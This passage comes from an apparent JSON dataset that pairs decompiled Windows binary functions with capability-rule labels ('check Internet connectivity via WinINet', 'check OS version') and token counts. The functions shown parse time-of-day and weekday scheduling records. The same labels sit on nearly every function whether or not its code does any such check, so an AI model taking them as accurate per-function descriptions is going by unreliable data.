        "decompiled_code": "\nvoid __cdecl fcn.0002c370(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_150h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    \n    fcn.00034550(0xb1c59f2c);\n    iVar1 = fcn.000235a0(0xfffffffe, 8, &arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        if (var_28h != 0) {\n            var_28h = var_28h + -1;\n            fcn.000237c0(var_40h, var_38h, var_3ch, 2, var_28h);\n        }\n        if (var_28h == 0) {\n            iVar1 = fcn.000290b0(var_38h, var_3ch, &var_150h, 0x104, &var_44h, 1);\n            if (iVar1 == 0) {\n                if ((var_2ch & 2) != 0) {\n                    fcn.0002c730(&var_150h, arg_8h);\n                }\n                fcn.00035e00(&var_150h);\n            }\n            fcn.000236f0(var_40h, var_38h, var_3ch);\n        }\n    }\n    fcn.000345c0(0xb1c59f2c);\n    return;\n}\n",
        "token_count": 361
    },
    "0002c560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c560(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00034550(0xb1c59f2c);\n    iVar1 = fcn.00023560(0xfffffffe, 8, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            if (arg_8h != 0) {\n                fcn.000237c0(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40), 2\n                             , 0);\n            }\n            fcn.0002c370(*(var_ch + 0xc + var_8h * 0x40));\n        }\n    }\n    fcn.000345c0(0xb1c59f2c);\n    fcn.00023800(var_ch);\n    return;\n}\n",
        "token_count": 290
    },
    "0002c610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002c610(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_8h = 0;\n    var_4h = fcn.000290b0(3, arg_8h, 0, 0, &var_ch, 0);\n    if (var_4h == 0) {\n        var_10h = fcn.00035200(var_ch);\n        if (var_10h == 0) {\n            var_14h = 0x21590004;\n        }\n        else {\n            var_4h = fcn.000290b0(3, arg_8h, var_10h, var_ch, &var_ch, 0);\n            if (var_4h == 0) {\n                var_8h = fcn.00035690(arg_ch, 0xb1be15ec);\n                if (var_8h == 0) {\n                    var_14h = fcn.00035620();\n                }\n                else {\n                    iVar1 = fcn.00035840(var_10h, 1, var_ch, var_8h);\n                    if (iVar1 == var_ch) {\n                        var_14h = 0;\n                    }\n                    else {\n                        var_14h = fcn.00035620();\n                    }\n                }\n            }\n            else {\n                var_14h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n    }\n    else {\n        var_14h = var_4h + 0x191U | 0x21590000;\n    }\n    fcn.00035330(var_10h);\n    if (var_8h != 0) {\n        fcn.00035b40(var_8h);\n    }\n    return var_14h;\n}\n",
        "token_count": 463
    },
    "0002c730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002c730(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint *arg_ch_00;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = 0;\n    var_8h = fcn.00035690(arg_8h, 0xb1be15e8);\n    if (var_8h == 0) {\n        var_38h = fcn.00035620();\n    }\n    else {\n        arg_ch_00 = &var_30h;\n        arg_8h_00 = fcn.00035920(var_8h);\n        iVar1 = fcn.00035c20(arg_8h_00, arg_ch_00);\n        if (iVar1 == -1) {\n            var_38h = fcn.00035620();\n        }\n        else {\n            var_ch = var_1ch;\n            var_34h = fcn.00035200(var_1ch);\n            if (var_34h == 0) {\n                var_38h = 0x21590004;\n            }\n            else {\n                iVar1 = fcn.000358b0(var_34h, 1, var_ch, var_8h);\n                if (iVar1 == var_ch) {\n                    var_4h = fcn.000292c0(3, arg_ch, var_34h, var_ch, 0, 1);\n                    if (var_4h == 0) {\n                        var_38h = 0;\n                    }\n                    else {\n                        var_38h = var_4h + 0x191U | 0x21590000;\n                    }\n                }\n                else {\n                    var_38h = fcn.00035620();\n                }\n            }\n        }\n    }\n    fcn.00035330(var_34h);\n    if (var_8h != 0) {\n        fcn.00035b40(var_8h);\n    }\n    return var_38h;\n}\n",
        "token_count": 506
    },
    "0002c840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002c840(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_38h = fcn.00029040(&var_14h);\n    if (var_38h == 0) {\n        var_18h = var_38h;\n        var_18h = fcn.00023560(var_14h, 3, &var_1ch, &var_24h);\n        if (var_18h == 0) {\n            var_34h = 0x37;\n            var_30h = 2;\n            var_2ch = 0x1b;\n            var_28h = 2;\n            var_4h = 0;\n            var_10h = 2;\n            var_ch = &var_34h;\n            var_8h = var_1ch;\n            var_4h = fcn.000352f0(var_1ch, 4);\n            if (var_4h == 0) {\n                var_38h = 0x21590004;\n            }\n            else {\n                for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n                    uVar1 = fcn.000352f0(var_10h, 0x10);\n                    *(var_4h + var_20h * 4) = uVar1;\n                    if (*(var_4h + var_20h * 4) != 0) {\n                        *(*(var_4h + var_20h * 4) + 4) = *(var_4h + var_20h * 4) + 8;\n                        **(var_4h + var_20h * 4) = 4;\n                        **(*(var_4h + var_20h * 4) + 4) = *(var_24h + 0xc + var_20h * 0x40);\n                        *(*(var_4h + var_20h * 4) + 0x14) = *(var_4h + var_20h * 4) + 0x18;\n                        *(*(var_4h + var_20h * 4) + 0x10) = 4;\n                        **(*(var_4h + var_20h * 4) + 0x14) = *(var_24h + 0x30 + var_20h * 0x40);\n                    }\n                }\n                var_38h = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n            }\n            fcn.00023800(var_24h);\n            if (var_4h != 0) {\n                for (var_20h = 0; var_20h < var_8h; var_20h = var_20h + 1) {\n                    fcn.00035330(*(var_4h + var_20h * 4));\n                }\n                fcn.00035330(var_4h);\n            }\n        }\n        else {\n            var_38h = var_18h + 0x191 | 0x21590000;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 877
    },
    "0002ca40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0002ca40(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, int16_t **arg_18h, int32_t *arg_1ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint var_248h;\n    uint var_240h;\n    int16_t *var_23ch;\n    uint var_238h;\n    uint var_230h;\n    uint *var_22ch;\n    uint var_228h;\n    int32_t var_11ch;\n    int32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    \n    *arg_14h = 2;\n    iVar3 = fcn.00020650(arg_10h, 0x21, 2, &var_110h, 4);\n    if (iVar3 == 0) {\n        var_118h = 0x21590065;\n    }\n    else {\n        iVar3 = fcn.00020650(arg_10h, 0x22, 3, &var_114h, 4);\n        if (iVar3 == 0) {\n            var_118h = 0x21590066;\n        }\n        else {\n            var_11ch = 0;\n            fcn.000205e0(arg_10h, 3, 4, &var_11ch, 0);\n            if (var_11ch == 0) {\n                var_10ch = NULL;\n            }\n            else {\n                fcn.000373f0(var_11ch, &var_108h, 0x104);\n                var_10ch = &var_108h;\n            }\n            var_118h = fcn.0002c070(var_110h, 0, var_114h, var_10ch, &var_228h);\n            if (var_118h == 0) {\n                var_22ch = &var_228h;\n                do {\n                    cVar1 = *var_22ch;\n                    var_22ch = var_22ch + 1;\n                } while (cVar1 != '\\0');\n                *arg_1ch = (var_22ch - (&var_228h + 1)) * 2;\n                piVar4 = fcn.00035200(*arg_1ch + 2);\n                *arg_18h = piVar4;\n                if (*arg_18h == NULL) {\n                    *arg_1ch = 0;\n                    fcn.0002c370(var_110h);\n                    var_118h = 0x21590004;\n                }\n                else {\n                    fcn.00037370(&var_228h, *arg_18h, 0xffffffff);\n                    var_23ch = *arg_18h;\n                    piVar4 = var_23ch + 1;\n                    do {\n                        iVar2 = *var_23ch;\n                        var_23ch = var_23ch + 1;\n                    } while (iVar2 != 0);\n                    *arg_1ch = (var_23ch - piVar4 >> 1) << 1;\n                }\n            }\n            else {\n                *arg_18h = NULL;\n                *arg_1ch = 0;\n            }\n        }\n    }\n    return var_118h;\n}\n",
        "token_count": 775
    },
    "0002cca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_180h\n\nuint32_t __cdecl fcn.0002cca0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_180h;\n    uint var_178h;\n    uint *var_174h;\n    uint var_16ch;\n    char *var_168h;\n    uint *var_164h;\n    uint var_160h;\n    uint var_158h;\n    uint *var_154h;\n    uint var_150h;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    var_10h = 0;\n    var_ch = NULL;\n    var_8h = 0;\n    var_4h = 0;\n    *arg_14h = 3;\n    var_14h = fcn.00023560(0xfffffffe, 8, &var_18h, &var_20h);\n    if (var_14h == 0) {\n        var_40h = 0x37;\n        var_3ch = 2;\n        var_38h = 0x1f;\n        var_34h = 200;\n        var_30h = 0x38;\n        var_2ch = 3;\n        var_28h = 0x39;\n        var_24h = 2;\n        var_10h = 4;\n        var_ch = &var_40h;\n        var_8h = var_18h;\n        var_4h = fcn.000352f0(var_18h, 4);\n        if (var_4h == 0) {\n            var_48h = 0x21590004;\n        }\n        else {\n            for (var_1ch = 0; var_1ch < var_18h; var_1ch = var_1ch + 1) {\n                iVar2 = fcn.000290b0(*(var_20h + 8 + var_1ch * 0x40), *(var_20h + 4 + var_1ch * 0x40), &var_150h, 0x104\n                                     , &var_44h, 1);\n                if (iVar2 == 0) {\n                    var_154h = &var_150h;\n                    do {\n                        cVar1 = *var_154h;\n                        var_154h = var_154h + 1;\n                    } while (cVar1 != '\\0');\n                    uVar3 = fcn.00035200(var_154h + ((var_10h * 0x10 + 1) - (&var_150h + 1)));\n                    *(var_4h + var_1ch * 4) = uVar3;\n                    if (*(var_4h + var_1ch * 4) != 0) {\n                        *(*(var_4h + var_1ch * 4) + 4) = *(var_4h + var_1ch * 4) + 8;\n                        **(var_4h + var_1ch * 4) = 4;\n                        **(*(var_4h + var_1ch * 4) + 4) = *(var_20h + 0xc + var_1ch * 0x40);\n                        *(*(var_4h + var_1ch * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_1ch * 4);\n                        var_164h = &var_150h;\n                        var_168h = *(*(var_4h + var_1ch * 4) + 0x14);\n                        do {\n                            cVar1 = *var_164h;\n                            *var_168h = cVar1;\n                            var_164h = var_164h + 1;\n                            var_168h = var_168h + 1;\n                        } while (cVar1 != '\\0');\n                        var_174h = &var_150h;\n                        do {\n                            cVar1 = *var_174h;\n                            var_174h = var_174h + 1;\n                        } while (cVar1 != '\\0');\n                        *(*(var_4h + var_1ch * 4) + 0x10) = var_174h + (1 - (&var_150h + 1));\n                        *(*(var_4h + var_1ch * 4) + 0x24) = *(var_4h + var_1ch * 4) + 0x28;\n                        *(*(var_4h + var_1ch * 4) + 0x20) = 4;\n                        **(*(var_4h + var_1ch * 4) + 0x24) = *(var_20h + 0x14 + var_1ch * 0x40);\n                        *(*(var_4h + var_1ch * 4) + 0x34) = *(var_4h + var_1ch * 4) + 0x38;\n                        *(*(var_4h + var_1ch * 4) + 0x30) = 4;\n                        **(*(var_4h + var_1ch * 4) + 0x34) = *(var_20h + 0x18 + var_1ch * 0x40);\n                    }\n                }\n            }\n            var_48h = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n        }\n    }\n    else {\n        var_48h = var_14h + 0x191U | 0x21590000;\n    }\n    fcn.00023800(var_20h);\n    if (var_4h != 0) {\n        for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n            fcn.00035330(*(var_4h + var_1ch * 4));\n        }\n        fcn.00035330(var_4h);\n    }\n    return var_48h;\n}\n",
        "token_count": 1547
    },
    "0002d100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002d100(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint var_180h;\n    char *var_17ch;\n    uint *var_178h;\n    uint var_170h;\n    char *var_16ch;\n    uint *var_168h;\n    uint var_160h;\n    char *var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_14ch;\n    uint *var_148h;\n    uint var_144h;\n    uint var_13ch;\n    uint *var_138h;\n    uint var_134h;\n    uint var_12ch;\n    uint *var_128h;\n    uint var_124h;\n    uint var_11ch;\n    uint *var_118h;\n    ushort *var_110h;\n    uint *var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_f8h;\n    uint *var_f4h;\n    ushort *var_ech;\n    uint32_t var_e8h;\n    uint32_t var_e4h;\n    uint var_deh;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint32_t var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    char *var_8dh;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    char *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_d8h = 4;\n    var_d4h = 2;\n    var_d0h = 0x17;\n    var_cch = 200;\n    var_c8h = 0x19;\n    var_c4h = 200;\n    var_c0h = 0x18;\n    var_bch = 200;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 4;\n    var_10h = &var_d8h;\n    var_18h = fcn.00023560(0xfffffffe, 6, &var_84h, &var_9ch);\n    if (var_18h == 0) {\n        var_ch = var_84h;\n        var_8h = fcn.000352f0(4, var_84h);\n        if (var_8h == 0) {\n            var_e4h = 0x21590004;\n        }\n        else {\n            for (var_88h = 0; var_88h < var_84h; var_88h = var_88h + 1) {\n                uVar2 = *(var_9ch + 0x10 + var_88h * 0x40) >> 0x10;\n                uVar3 = *(var_9ch + 0x10 + var_88h * 0x40) >> 8;\n                var_8dh._0_1_ = *(var_9ch + 0x10 + var_88h * 0x40);\n                var_a0h = *(var_9ch + 0x14 + var_88h * 0x40);\n                if ((uVar2 < 0x18) && (uVar3 < 0x3c)) {\n                    fcn.0007865e(&var_98h, 0xb1be16c0, uVar2, uVar3);\n                }\n                else {\n                    var_98h = *0xb1be16cc;\n                    var_94h = *0xb1be16d0;\n                }\n                if ((var_8dh & 0x7f) == 0x7f) {\n                    var_b8h._0_2_ = *0xb1be16d4;\n                }\n                else {\n                    var_b8h._0_2_ = var_b8h & 0xff00;\n                    var_4h = 1;\n                    for (var_e8h = 0; var_e8h < 7; var_e8h = var_e8h + 1) {\n                        if ((1 << (var_e8h & 0x1f) & var_8dh) != 0) {\n                            if (var_4h == 0) {\n                                var_ech = &var_bch + 3;\n                                do {\n                                    pcVar4 = var_ech + 1;\n                                    var_ech = var_ech + 1;\n                                } while (*pcVar4 != '\\0');\n                                *var_ech = *0xb1be16d8;\n                            }\n                            else {\n                                var_4h = 0;\n                            }\n                            puVar7 = var_e8h * 3 + -0x4e3a7490;\n                            var_f4h = puVar7;\n                            do {\n                                cVar1 = *var_f4h;\n                                var_f4h = var_f4h + 1;\n                            } while (cVar1 != '\\0');\n                            var_108h = &var_bch + 3;\n                            do {\n                                pcVar4 = var_108h + 1;\n                                var_108h = var_108h + 1;\n                            } while (*pcVar4 != '\\0');\n                            puVar8 = puVar7;\n                            for (uVar6 = var_f4h - puVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *var_108h = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                var_108h = var_108h + 1;\n                            }\n                            for (uVar6 = var_f4h - puVar7 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *var_108h = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                var_108h = var_108h + 1;\n                            }\n                        }\n                    }\n                }\n                if ((var_a0h & 0x7fffffff) == 0x7fffffff) {\n                    var_80h._0_2_ = *0xb1be16d4;\n                }\n                else {\n                    var_80h._0_2_ = var_80h._1_1_ << 8;\n                    var_4h = 1;\n                    for (var_e8h = 1; var_e8h < 0x20; var_e8h = var_e8h + 1) {\n                        if ((1 << (var_e8h & 0x1f) & var_a0h) != 0) {\n                            if (var_4h == 0) {\n                                var_110h = &var_84h + 3;\n                                do {\n                                    pcVar4 = var_110h + 1;\n                                    var_110h = var_110h + 1;\n                                } while (*pcVar4 != '\\0');\n                                *var_110h = *0xb1be16d8;\n                            }\n                            else {\n                                var_4h = 0;\n                            }\n                            puVar7 = &var_80h;\n                            do {\n                                var_118h = puVar7;\n                                puVar7 = var_118h + 1;\n                            } while (*var_118h != '\\0');\n                            fcn.0007865e(var_118h, 0xb1be15f0, var_e8h);\n                        }\n                    }\n                }\n                var_128h = &var_98h;\n                do {\n                    cVar1 = *var_128h;\n                    var_128h = var_128h + 1;\n                } while (cVar1 != '\\0');\n                *NULL = var_128h + (1 - (&var_98h + 1));\n                var_138h = &var_b8h;\n                do {\n                    cVar1 = *var_138h;\n                    var_138h = var_138h + 1;\n                } while (cVar1 != '\\0');\n                var_1ch = var_138h + (1 - (&var_b8h + 1));\n                var_148h = &var_80h;\n                do {\n                    cVar1 = *var_148h;\n                    var_148h = var_148h + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = var_148h + (1 - (&var_80h + 1));\n                uVar5 = fcn.00035200(*NULL + var_14h * 0x10 + var_1ch + pcVar4);\n                *(var_8h + var_88h * 4) = uVar5;\n                if (*(var_8h + var_88h * 4) == 0) {\n                    var_e4h = 0x21590004;\n                    goto code_r0x0002d9a4;\n                }\n                fcn.00078790(*(var_8h + var_88h * 4), 0, var_14h << 4);\n                *(*(var_8h + var_88h * 4) + 4) = *(var_8h + var_88h * 4) + 8;\n                **(var_8h + var_88h * 4) = 4;\n                **(*(var_8h + var_88h * 4) + 4) = *(var_9ch + 0xc + var_88h * 0x40);\n                var_158h = &var_98h;\n                var_15ch = var_14h * 0x10 + *(var_8h + var_88h * 4);\n                do {\n                    cVar1 = *var_158h;\n                    *var_15ch = cVar1;\n                    var_158h = var_158h + 1;\n                    var_15ch = var_15ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x14) = var_14h * 0x10 + *(var_8h + var_88h * 4);\n                *(*(var_8h + var_88h * 4) + 0x10) = stack0xffffff70;\n                var_168h = &var_b8h;\n                var_16ch = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10;\n                do {\n                    cVar1 = *var_168h;\n                    *var_16ch = cVar1;\n                    var_168h = var_168h + 1;\n                    var_16ch = var_16ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x24) = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10;\n                *(*(var_8h + var_88h * 4) + 0x20) = var_1ch;\n                var_178h = &var_80h;\n                var_17ch = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10 + var_1ch;\n                do {\n                    cVar1 = *var_178h;\n                    *var_17ch = cVar1;\n                    var_178h = var_178h + 1;\n                    var_17ch = var_17ch + 1;\n                } while (cVar1 != '\\0');\n                *(*(var_8h + var_88h * 4) + 0x34) = stack0xffffff70 + *(var_8h + var_88h * 4) + var_14h * 0x10 + var_1ch\n                ;\n                *(*(var_8h + var_88h * 4) + 0x30) = pcVar4;\n            }\n            var_e4h = fcn.0002ee00(&var_14h, arg_18h, arg_1ch);\n        }\ncode_r0x0002d9a4:\n        if (var_8h != 0) {\n            for (var_88h = 0; var_88h < var_ch; var_88h = var_88h + 1) {\n                fcn.00035330(*(var_8h + var_88h * 4));\n            }\n            fcn.00035330(var_8h);\n        }\n        fcn.00023800(var_9ch);\n    }\n    else {\n        var_e4h = var_18h + 0x191U | 0x21590000;\n    }\n    return var_e4h;\n}\n",
        "token_count": 3075
    },
    "0002da10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002da10(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.00020650(arg_10h, 9, 2, &var_4ch, 4);\n    if (iVar1 == 0) {\n        while (iVar1 = fcn.000235a0(0xfffffffe, 6, 0, &var_48h),  iVar1 == 0) {\n            fcn.000236f0(0xfffffffe, 6, var_44h);\n        }\n    }\n    else {\n        var_4h = fcn.000235a0(0xfffffffe, 6, &var_4ch, &var_48h);\n        if (var_4h != 0) {\n            return var_4h + 0x191U | 0x21590000;\n        }\n        iVar1 = fcn.000236f0(0xfffffffe, 6, var_44h);\n        if (iVar1 != 0) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 322
    },
    "0002dab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0002dab0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = fcn.0002daf0(1);\n    while( true ) {\n        iVar1 = fcn.000340e0(0xb1c685d0, var_4h);\n        if ((iVar1 == 1) && (*0xb1c59f30 != 0)) break;\n        var_4h = fcn.0002daf0(0);\n    }\n    return 0;\n}\n",
        "token_count": 123
    },
    "0002daf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0002daf0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_28h;\n    uint32_t var_24h;\n    uint8_t var_1eh;\n    uint8_t var_1dh;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    char var_9h;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00035e60(&var_28h);\n    var_1ch = fcn.000363b0(&var_28h);\n    var_24h = (0x15180 - (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch)) * 1000;\n    iVar2 = fcn.00023560(0xfffffffe, 6, &var_4h, &var_10h);\n    if (iVar2 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            var_1eh = *(var_10h + 0x10 + var_8h * 0x40) >> 0x10;\n            var_1dh = *(var_10h + 0x10 + var_8h * 0x40) >> 8;\n            uVar1 = *(var_10h + 0x10 + var_8h * 0x40);\n            var_9h = uVar1;\n            var_18h = *(var_10h + 0x14 + var_8h * 0x40);\n            if ((((var_1eh < 0x18) && (var_1dh < 0x3c)) && (var_9h != '\\0')) && (var_18h != 0)) {\n                if (((1 << (var_1ch[3] & 0x1f) & var_18h) != 0) && ((1 << (var_1ch[6] & 0x1f) & uVar1 & 0xff) != 0)) {\n                    iVar2 = (var_1eh * 0x3c + var_1dh) * 0x3c;\n                    iVar3 = var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch;\n                    if (iVar2 - iVar3 == 0 || iVar2 < iVar3) {\n                        var_14h = (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch +\n                                  (var_1eh * 0x3c + var_1dh) * -0x3c) * 1000;\n                        if (var_14h < 0x493e1) {\n                            fcn.0002ddd0(*(var_10h + 0xc + var_8h * 0x40), *(var_10h + 0x18 + var_8h * 0x40), \n                                         *(var_10h + 4 + var_8h * 0x40), *(var_10h + 0x30 + var_8h * 0x40));\n                            fcn.000236f0(*(var_10h + var_8h * 0x40), *(var_10h + 8 + var_8h * 0x40), \n                                         *(var_10h + 4 + var_8h * 0x40));\n                        }\n                    }\n                    else {\n                        var_14h = ((var_1eh * 0x3c + var_1dh) * 0x3c -\n                                  (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch)) * 1000;\n                        if (var_14h < var_24h) {\n                            var_24h = var_14h;\n                        }\n                    }\n                }\n            }\n            else if (arg_8h != 0) {\n                fcn.0002ddd0(*(var_10h + 0xc + var_8h * 0x40), *(var_10h + 0x18 + var_8h * 0x40), \n                             *(var_10h + 4 + var_8h * 0x40), *(var_10h + 0x30 + var_8h * 0x40));\n                fcn.000236f0(*(var_10h + var_8h * 0x40), *(var_10h + 8 + var_8h * 0x40), *(var_10h + 4 + var_8h * 0x40))\n                ;\n            }\n        }\n        fcn.00023800(var_10h);\n    }\n    return var_24h;\n}\n",
        "token_count": 1166
    },
    "0002ddd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
